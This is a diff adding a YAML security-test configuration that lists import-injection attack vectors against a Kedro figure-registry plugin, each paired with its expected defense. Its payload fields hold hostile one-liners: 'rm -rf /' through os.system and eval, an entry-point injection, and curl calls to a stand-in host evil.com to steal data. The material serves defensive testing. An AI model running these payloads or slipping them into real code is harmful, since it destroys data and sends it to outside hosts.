@@ -1,0 +1,462 @@
+# Import Injection Security Test Configuration
+# Tests protection against dynamic import exploitation, module loading manipulation,
+# and plugin discovery security boundary violations per Section 6.6.8.5
+#
+# This configuration defines comprehensive attack vectors targeting:
+# - Dynamic module loading and importlib exploitation
+# - Import path manipulation and traversal attempts
+# - Plugin discovery bypass and hook registration exploitation
+# - Code injection through import mechanism manipulation
+# - Module loading constraint enforcement validation
+
+metadata:
+  test_type: "import_injection_security"
+  target_components:
+    - "figregistry_kedro.hooks.FigRegistryHooks"
+    - "figregistry_kedro.datasets.FigureDataSet"
+    - "figregistry_kedro.config.FigRegistryConfigBridge"
+  description: "Comprehensive import injection and dynamic loading security validation"
+  security_domains:
+    - "dynamic_import_security"
+    - "module_loading_constraints"
+    - "plugin_discovery_protection"
+    - "import_boundary_enforcement"
+  compliance_requirements:
+    - "Section 6.6.8.5: Dynamic Import Security Testing"
+    - "Section 6.6.8.3: Hook Security Validation"
+    - "Section 6.6.8.4: Packaging Security Testing"
+
+# Dynamic Import Security Test Vectors
+dynamic_import_attacks:
+  # Importlib exploitation vectors targeting dynamic loading constraints
+  importlib_exploitation:
+    description: "Tests importlib usage security and remote code execution prevention"
+    attack_vectors:
+      - name: "malicious_module_injection"
+        method: "importlib.import_module"
+        payload: "__import__('os').system('rm -rf /')"
+        target: "hooks.py:import_module_resolution"
+        expected_defense: "ImportError with safe module validation"
+        
+      - name: "importlib_util_exploitation"
+        method: "importlib.util.spec_from_file_location"
+        payload: "importlib.util.spec_from_file_location('malicious', '/tmp/evil.py')"
+        target: "datasets.py:dynamic_import_resolution"
+        expected_defense: "Path validation prevents arbitrary file loading"
+        
+      - name: "sys_modules_manipulation"
+        method: "sys.modules injection"
+        payload: "sys.modules['figregistry'] = malicious_module"
+        target: "config.py:module_cache_manipulation"
+        expected_defense: "Module integrity verification blocks injection"
+
+  # Module loading constraint testing
+  module_loading_constraints:
+    description: "Validates module loading boundary enforcement"
+    attack_vectors:
+      - name: "unauthorized_kedro_import"
+        method: "kedro module bypass"
+        payload: "kedro.framework.session.KedroSession._create_session(None)"
+        target: "hooks.py:kedro_import_validation"
+        expected_defense: "Kedro availability check prevents unauthorized access"
+        
+      - name: "figregistry_core_bypass"
+        method: "figregistry module manipulation"
+        payload: "figregistry.__dict__['init_config'] = malicious_function"
+        target: "datasets.py:figregistry_import_security"
+        expected_defense: "Module attribute protection prevents hijacking"
+        
+      - name: "optional_import_exploitation"
+        method: "graceful fallback exploitation"
+        payload: "HAS_KEDRO = True; kedro = malicious_kedro_module"
+        target: "hooks.py:optional_import_validation"
+        expected_defense: "Import validation prevents fake module injection"
+
+# Plugin Discovery Security Test Vectors
+plugin_discovery_attacks:
+  # Hook registration security testing
+  hook_registration_exploitation:
+    description: "Tests hook registration security and entry point validation"
+    attack_vectors:
+      - name: "entry_point_injection"
+        method: "setuptools entry_points manipulation"
+        payload: |
+          [kedro.hooks]
+          malicious_hooks = evil_module:MaliciousHooks
+        target: "hooks.py:hook_registration_security"
+        expected_defense: "Entry point validation blocks unauthorized hooks"
+        
+      - name: "hook_spec_bypass"
+        method: "hook specification exploitation"
+        payload: "class FakeHooks: @hook_impl; def execute_malicious(self): pass"
+        target: "hooks.py:hook_specification_validation"
+        expected_defense: "Hook spec validation prevents unauthorized methods"
+        
+      - name: "plugin_manager_injection"
+        method: "kedro plugin manager manipulation"
+        payload: "plugin_manager.register(MaliciousPlugin())"
+        target: "hooks.py:plugin_manager_security"
+        expected_defense: "Plugin registration validation blocks malicious plugins"
+
+  # Dataset registration security
+  dataset_discovery_exploitation:
+    description: "Tests dataset discovery and catalog integration security"
+    attack_vectors:
+      - name: "dataset_type_injection"
+        method: "catalog dataset type manipulation"
+        payload: |
+          my_dataset:
+            type: "eval:__import__('os').system('malicious_command')"
+        target: "datasets.py:dataset_type_validation"
+        expected_defense: "Type string validation prevents code injection"
+        
+      - name: "abstractdataset_bypass"
+        method: "AbstractDataSet interface exploitation"
+        payload: "class MaliciousDataSet(AbstractDataset): def _save(self): execute_payload()"
+        target: "datasets.py:abstractdataset_validation"
+        expected_defense: "Interface validation prevents unauthorized implementations"
+
+# Import Path Manipulation Test Vectors
+import_path_attacks:
+  # Path traversal and manipulation
+  path_traversal_exploitation:
+    description: "Tests import path traversal and manipulation prevention"
+    attack_vectors:
+      - name: "relative_import_traversal"
+        method: "relative import path exploitation"
+        payload: "from ../../../../etc.passwd import *"
+        target: "config.py:relative_import_validation"
+        expected_defense: "Relative import constraints prevent traversal"
+        
+      - name: "absolute_path_injection"
+        method: "absolute import path manipulation"
+        payload: "import sys; sys.path.insert(0, '/tmp/malicious'); import evil_module"
+        target: "hooks.py:sys_path_protection"
+        expected_defense: "Sys.path protection prevents unauthorized directories"
+        
+      - name: "symlink_exploitation"
+        method: "symbolic link import exploitation"
+        payload: "import /tmp/symlink_to_malicious_module"
+        target: "datasets.py:symlink_import_validation"
+        expected_defense: "Symlink resolution validation prevents exploitation"
+
+  # Module name manipulation
+  module_name_manipulation:
+    description: "Tests module name validation and manipulation prevention"
+    attack_vectors:
+      - name: "module_name_injection"
+        method: "module name code injection"
+        payload: "exec('import os; os.system(\"rm -rf /\")')"
+        target: "config.py:module_name_validation"
+        expected_defense: "Module name sanitization prevents code execution"
+        
+      - name: "unicode_module_names"
+        method: "unicode module name exploitation"
+        payload: "import 𝐦𝐚𝐥𝐢𝐜𝐢𝐨𝐮𝐬_𝗺𝐨𝐝𝐮𝐥𝐞"
+        target: "hooks.py:unicode_import_validation"
+        expected_defense: "Unicode validation prevents deceptive module names"
+        
+      - name: "null_byte_injection"
+        method: "null byte module name injection"
+        payload: "import 'safe_module\\x00malicious_code'"
+        target: "datasets.py:null_byte_validation"
+        expected_defense: "Null byte filtering prevents injection attacks"
+
+# Code Injection Through Import Mechanism Test Vectors
+code_injection_attacks:
+  # Import statement injection
+  import_statement_injection:
+    description: "Tests code injection through import statement manipulation"
+    attack_vectors:
+      - name: "import_exec_injection"
+        method: "exec injection through import"
+        payload: "__import__('os').system('curl http://evil.com/steal_data')"
+        target: "hooks.py:import_exec_validation"
+        expected_defense: "Import statement validation prevents exec injection"
+        
+      - name: "eval_import_injection"
+        method: "eval injection through import mechanism"
+        payload: "eval(\"__import__('subprocess').call(['rm', '-rf', '/'])\")"
+        target: "datasets.py:eval_import_validation"
+        expected_defense: "Eval blocking prevents code execution through imports"
+        
+      - name: "compile_injection"
+        method: "compile function exploitation"
+        payload: "compile('__import__(\"os\").system(\"malicious\")', '<string>', 'exec')"
+        target: "config.py:compile_injection_validation"
+        expected_defense: "Compile function restrictions prevent code compilation"
+
+  # Module attribute manipulation
+  module_attribute_injection:
+    description: "Tests module attribute manipulation and protection"
+    attack_vectors:
+      - name: "builtins_manipulation"
+        method: "__builtins__ module manipulation"
+        payload: "__builtins__.__dict__['__import__'] = malicious_import"
+        target: "hooks.py:builtins_protection"
+        expected_defense: "Builtins protection prevents import hijacking"
+        
+      - name: "globals_manipulation"
+        method: "globals() dictionary manipulation"
+        payload: "globals()['__import__'] = lambda name: malicious_module"
+        target: "datasets.py:globals_protection"
+        expected_defense: "Globals protection prevents import replacement"
+        
+      - name: "locals_exploitation"
+        method: "locals() dictionary exploitation"
+        payload: "locals()['figregistry'] = malicious_figregistry"
+        target: "config.py:locals_protection"
+        expected_defense: "Locals isolation prevents module replacement"
+
+# Importlib Security Boundary Enforcement
+importlib_security_boundaries:
+  # Importlib.util exploitation
+  importlib_util_attacks:
+    description: "Tests importlib.util security boundary enforcement"
+    attack_vectors:
+      - name: "spec_from_loader_injection"
+        method: "importlib.util.spec_from_loader exploitation"
+        payload: "importlib.util.spec_from_loader('evil', malicious_loader)"
+        target: "hooks.py:spec_loader_validation"
+        expected_defense: "Loader validation prevents malicious spec creation"
+        
+      - name: "module_from_spec_injection"
+        method: "importlib.util.module_from_spec exploitation"
+        payload: "importlib.util.module_from_spec(malicious_spec)"
+        target: "datasets.py:module_spec_validation"
+        expected_defense: "Spec validation prevents malicious module creation"
+        
+      - name: "find_spec_manipulation"
+        method: "importlib.util.find_spec exploitation"
+        payload: "importlib.util.find_spec('../../malicious_module')"
+        target: "config.py:find_spec_validation"
+        expected_defense: "Spec finding validation prevents path traversal"
+
+  # Import hook manipulation
+  import_hook_attacks:
+    description: "Tests import hook security and manipulation prevention"
+    attack_vectors:
+      - name: "meta_path_injection"
+        method: "sys.meta_path manipulation"
+        payload: "sys.meta_path.insert(0, MaliciousMetaPathFinder())"
+        target: "hooks.py:meta_path_protection"
+        expected_defense: "Meta path protection prevents hook injection"
+        
+      - name: "path_hooks_exploitation"
+        method: "sys.path_hooks manipulation"
+        payload: "sys.path_hooks.append(malicious_path_hook)"
+        target: "datasets.py:path_hooks_protection"
+        expected_defense: "Path hooks protection prevents import interception"
+        
+      - name: "modules_manipulation"
+        method: "sys.modules cache manipulation"
+        payload: "sys.modules['figregistry_kedro'] = malicious_module"
+        target: "config.py:modules_cache_protection"
+        expected_defense: "Module cache protection prevents replacement"
+
+# Plugin Discovery Exploitation Vectors
+plugin_discovery_exploitation:
+  # Entry point manipulation
+  entry_point_attacks:
+    description: "Tests entry point security and validation"
+    attack_vectors:
+      - name: "setuptools_entry_point_injection"
+        method: "setuptools entry_points.txt manipulation"
+        payload: |
+          [kedro.hooks]
+          evil_hooks = __import__('os').system('rm -rf /'):malicious_class
+        target: "hooks.py:entry_point_validation"
+        expected_defense: "Entry point parsing validation prevents injection"
+        
+      - name: "pkg_resources_exploitation"
+        method: "pkg_resources entry point exploitation"
+        payload: "pkg_resources.load_entry_point('evil_package', 'kedro.hooks', 'malicious')"
+        target: "hooks.py:pkg_resources_validation"
+        expected_defense: "Package validation prevents malicious entry point loading"
+        
+      - name: "importlib_metadata_injection"
+        method: "importlib.metadata entry point injection"
+        payload: "importlib.metadata.entry_points(group='kedro.hooks')[0].load()"
+        target: "hooks.py:metadata_entry_point_validation"
+        expected_defense: "Entry point loading validation prevents malicious execution"
+
+  # Hook registration bypass
+  hook_registration_bypass:
+    description: "Tests hook registration security bypass attempts"
+    attack_vectors:
+      - name: "direct_hook_manager_access"
+        method: "Direct hook manager manipulation"
+        payload: "hook_manager._plugin_instances.append(MaliciousPlugin())"
+        target: "hooks.py:hook_manager_protection"
+        expected_defense: "Hook manager protection prevents direct manipulation"
+        
+      - name: "pluggy_exploitation"
+        method: "Pluggy framework exploitation"
+        payload: "pm.register(plugin=malicious_instance, name='evil_plugin')"
+        target: "hooks.py:pluggy_registration_validation"
+        expected_defense: "Plugin registration validation blocks malicious plugins"
+        
+      - name: "hook_specification_bypass"
+        method: "Hook specification bypass attempt"
+        payload: "class BypassHooks: def malicious_method(self): execute_payload()"
+        target: "hooks.py:hook_spec_enforcement"
+        expected_defense: "Hook specification enforcement prevents unauthorized methods"
+
+# Module Loading Protection Validation
+module_loading_protection:
+  # Safe import enforcement
+  safe_import_validation:
+    description: "Tests safe import mechanism enforcement"
+    attack_vectors:
+      - name: "unsafe_import_detection"
+        method: "Unsafe import pattern detection"
+        payload: "__import__('subprocess').Popen(['curl', 'http://evil.com'])"
+        target: "config.py:unsafe_import_detection"
+        expected_defense: "Unsafe import pattern detection blocks execution"
+        
+      - name: "import_from_exploitation"
+        method: "from...import statement exploitation"
+        payload: "from os import system; system('malicious_command')"
+        target: "hooks.py:import_from_validation"
+        expected_defense: "Import from validation prevents dangerous imports"
+        
+      - name: "star_import_exploitation"
+        method: "Star import exploitation"
+        payload: "from malicious_module import *"
+        target: "datasets.py:star_import_validation"
+        expected_defense: "Star import restrictions prevent namespace pollution"
+
+  # Module isolation enforcement
+  module_isolation_validation:
+    description: "Tests module isolation and boundary enforcement"
+    attack_vectors:
+      - name: "cross_module_injection"
+        method: "Cross-module state injection"
+        payload: "figregistry_kedro.hooks._global_lock = malicious_lock"
+        target: "hooks.py:cross_module_protection"
+        expected_defense: "Cross-module protection prevents state injection"
+        
+      - name: "namespace_pollution"
+        method: "Namespace pollution attack"
+        payload: "globals().update(malicious_namespace)"
+        target: "datasets.py:namespace_protection"
+        expected_defense: "Namespace protection prevents pollution"
+        
+      - name: "module_state_manipulation"
+        method: "Module state manipulation"
+        payload: "_initialization_state['config_bridge'] = malicious_bridge"
+        target: "hooks.py:module_state_protection"
+        expected_defense: "Module state protection prevents manipulation"
+
+# Security Test Execution Configuration
+test_execution_config:
+  # Test environment setup
+  environment_setup:
+    isolation_level: "maximum"
+    sandbox_enabled: true
+    network_access: false
+    filesystem_restrictions: true
+    import_monitoring: true
+    
+  # Validation criteria
+  validation_criteria:
+    - name: "import_constraint_enforcement"
+      description: "Verify that import constraints are properly enforced"
+      success_condition: "All unauthorized imports blocked with appropriate exceptions"
+      
+    - name: "module_loading_protection"
+      description: "Validate module loading protection mechanisms"
+      success_condition: "Malicious module loading attempts prevented"
+      
+    - name: "plugin_discovery_security"
+      description: "Ensure plugin discovery security is maintained"
+      success_condition: "Unauthorized plugin registration blocked"
+      
+    - name: "code_injection_prevention"
+      description: "Verify code injection through imports is prevented"
+      success_condition: "All code injection attempts blocked"
+      
+    - name: "import_boundary_enforcement"
+      description: "Validate import security boundary enforcement"
+      success_condition: "Security boundaries maintained under all test conditions"
+
+  # Performance requirements
+  performance_requirements:
+    max_test_execution_time: "30s"
+    max_memory_usage: "500MB"
+    security_overhead_limit: "10%"
+    
+  # Reporting configuration
+  reporting_config:
+    generate_detailed_report: true
+    include_attack_vectors: true
+    log_security_events: true
+    capture_stack_traces: true
+    performance_metrics: true
+
+# Expected Security Controls
+expected_security_controls:
+  # Import validation controls
+  import_validation:
+    - "Module name sanitization and validation"
+    - "Import path traversal prevention"
+    - "Relative import constraint enforcement"
+    - "Absolute path import restrictions"
+    
+  # Dynamic loading controls
+  dynamic_loading_protection:
+    - "Importlib usage security validation"
+    - "Module loading constraint enforcement"
+    - "Plugin discovery security boundaries"
+    - "Hook registration validation"
+    
+  # Code injection prevention
+  code_injection_prevention:
+    - "Import statement validation"
+    - "Exec/eval blocking in import context"
+    - "Module attribute manipulation protection"
+    - "Builtins and globals protection"
+    
+  # Boundary enforcement
+  security_boundary_enforcement:
+    - "Cross-module access restrictions"
+    - "Namespace isolation maintenance"
+    - "Module state protection"
+    - "Import hook security validation"
+
+# Test Data Sources
+test_data_sources:
+  malicious_modules:
+    - "tests/data/security/malicious_figregistry.py"
+    - "tests/data/security/malicious_kedro.py"
+    - "tests/data/security/malicious_hooks.py"
+    
+  injection_payloads:
+    - "tests/data/security/import_injection_payloads.txt"
+    - "tests/data/security/module_manipulation_scripts.py"
+    - "tests/data/security/plugin_exploitation_vectors.yml"
+    
+  validation_scripts:
+    - "tests/data/security/import_security_validation.py"
+    - "tests/data/security/module_loading_tests.py"
+    - "tests/data/security/plugin_discovery_tests.py"
+
+# Compliance and Documentation
+compliance_validation:
+  security_requirements:
+    - "Section 6.6.8.5: Dynamic Import Security Testing"
+    - "Section 6.6.8.3: Hook Security Validation" 
+    - "Section 6.6.8.4: Packaging Security Testing"
+    - "Section 6.6.8.2: File System Security Testing"
+    
+  test_coverage_requirements:
+    import_security: "≥90%"
+    module_loading: "≥90%" 
+    plugin_discovery: "≥85%"
+    code_injection_prevention: "≥95%"
+    
+  documentation_requirements:
+    - "Attack vector documentation with examples"
+    - "Security control validation procedures"
+    - "Incident response for discovered vulnerabilities"
+    - "Security baseline establishment and maintenance"
